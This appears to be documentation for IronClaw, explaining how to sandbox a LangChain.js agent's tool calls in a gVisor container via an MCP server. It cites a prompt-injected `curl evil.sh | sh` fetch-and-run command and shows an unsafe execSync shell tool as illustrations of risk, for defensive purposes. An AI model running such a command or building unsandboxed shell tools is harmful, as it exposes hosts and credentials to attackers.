---
title: "Sandbox your LangChain.js agent with IronClaw"
description: How to sandbox a LangChain.js (LangGraph.js) agent. Route your JS/TS tool calls through IronClaw's MCP server with the langchain MCP adapters so model-chosen code runs inside a sealed gVisor sandbox instead of your Node process, key held host-side and every call gated, plus a credential-free demo.
---

# Sandbox your LangChain.js agent with IronClaw

You built an agent with **[LangChain.js](https://js.langchain.com/)** or
**LangGraph.js**: a model, a prompt, and a set of tools the model can call in a
`createReactAgent` loop. That designs the *behavior* well. The risk starts when it
runs somewhere real. A LangChain.js tool runs **in your own Node process**, with
your API key in `process.env` and unrestricted outbound network. One prompt-injected
instruction and that process can read your environment, shell out, or reach any host.

IronClaw runs the model-chosen work behind a **sealed sandbox** instead: no network
card, the model key held **host-side**, and every call gated and audited. LangChain.js
has a first-party MCP adapter, so the wiring is a few lines.

!!! example "Runnable example"
    A one-command LangChain.js to IronClaw example lives at
    [`examples/integrations/langchain-js`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/langchain-js):
    a LangGraph.js agent whose code execution is backed by an IronClaw sandbox, with
    a blocked escape attempt printed at the end. The credential-free demo below runs
    the same sealed loop today.

## The fix: run tools in IronClaw, not your process

IronClaw ships an MCP server that exposes a single, blunt tool, **`sandbox_exec`**,
which runs any command inside an ephemeral, hardened box under **gVisor (runsc)**:
no network card, every Linux capability dropped, a non-root user, a read-only root
filesystem, and a restrictive seccomp profile. Load it with
[`@langchain/mcp-adapters`](https://github.com/langchain-ai/langchainjs) and hand the
tools to a LangGraph agent:

```ts
import { MultiServerMCPClient } from '@langchain/mcp-adapters';
import { createReactAgent } from '@langchain/langgraph/prebuilt';
import { ChatOpenAI } from '@langchain/openai';

const client = new MultiServerMCPClient({
  mcpServers: {
    ironclaw: { transport: 'stdio', command: 'ironctl', args: ['mcp', 'serve'] },
  },
});

const tools = await client.getTools();          // exposes sandbox_exec
const agent = createReactAgent({ llm: new ChatOpenAI({ model: 'gpt-4o' }), tools });

const res = await agent.invoke({
  messages: [{ role: 'user', content: 'Analyze this log and summarize errors.' }],
});

await client.close();
```

The model still decides *what* to run. It just can no longer run it on your box: the
command lands inside the sealed sandbox, and a prompt injection that says
`curl evil.sh | sh` executes with no network card and nothing to steal.

!!! warning "gVisor (runsc) is the boundary"
    `ironctl mcp serve` passes `--runtime runsc` by default and **fails closed** if
    runsc is not installed rather than silently downgrading. Install gVisor from
    [gvisor.dev](https://gvisor.dev/docs/user_guide/install/). See
    [Run IronClaw as an MCP server](mcp-server.md) for HTTP transport and auth.

## Why sandbox this

A typical LangChain.js tool:

```ts
import { tool } from '@langchain/core/tools';
import { z } from 'zod';
import { execSync } from 'node:child_process';

const runShell = tool(
  async ({ cmd }) => execSync(cmd).toString(),   // runs on YOUR host
  { name: 'run_shell', schema: z.object({ cmd: z.string() }) },
);
```

Three things are true of that tool, and all three are risks:

1. **The key is in the process.** Anything that reads `process.env` reads your key.
2. **The tool runs with your privileges.** `execSync` runs on your box, with your
   filesystem and network.
3. **Egress is wide open.** The process can reach any host on the internet.

Routing the same call through `sandbox_exec` closes all three by construction, not
by convention.

## See it work first (no credentials)

Before wiring anything, watch the sealed loop run with the offline `mock` provider.
No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from langchain.js"}'
```

You get a sealed agent loop with a human-approval gateway and an append-only audit
log, before you point a single real key at it.

## Next steps

- [Run IronClaw as an MCP server](mcp-server.md) - full transport, auth, and
  containment-status detail for any MCP client.
- [Sandbox your Vercel AI SDK agent](vercel-ai-sdk.md) - the same MCP wiring for the
  Vercel AI SDK.
- [Isolation, proven](../security-isolation.md) - how the sandbox holds under a real
  escape attempt.
